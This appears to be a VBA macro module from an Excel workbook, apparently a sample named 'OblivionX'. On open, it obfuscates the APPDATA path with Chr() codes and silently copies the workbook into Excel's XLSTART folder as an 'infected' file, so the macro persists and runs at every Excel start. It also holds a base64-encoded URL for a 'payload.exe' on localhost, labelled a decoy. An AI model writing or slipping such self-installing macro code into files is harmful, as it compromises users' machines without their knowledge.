Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim dst As String
    dst = Environ(Chr(65) & Chr(80) & Chr(80) & Chr(68) & Chr(65) & Chr(84) & Chr(65)) & "\Microsoft\Excel\XLSTART\oblivionx_infected.xlsm"
    ThisWorkbook.SaveCopyAs dst
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
